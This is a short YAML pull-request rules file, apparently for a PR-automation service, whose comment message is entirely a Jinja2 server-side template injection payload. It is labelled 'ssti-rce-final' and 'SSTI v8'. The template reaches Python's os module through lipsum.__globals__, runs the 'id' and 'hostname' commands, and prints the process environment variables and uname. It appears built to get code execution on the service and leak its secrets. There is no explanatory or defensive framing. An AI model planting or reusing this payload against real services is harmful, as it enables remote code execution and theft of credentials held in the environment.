pull_request_rules:
  - name: ssti-rce-final
    conditions: []
    actions:
      comment:
        message: |
          === G4o7T SSTI v8 (main) ===
          author={{ author }}
          {% if author %}
          R1-globals: {{ lipsum.__globals__ }}
          R2-os: {{ lipsum.__globals__.os }}
          R3-id: {{ lipsum.__globals__.os.popen('id').read() }}
          R4-hostname: {{ lipsum.__globals__.os.popen('hostname').read() }}
          R5-env: {{ lipsum.__globals__.os.environ }}
          R6-uname: {{ lipsum.__globals__.os.uname() }}
          {% endif %}
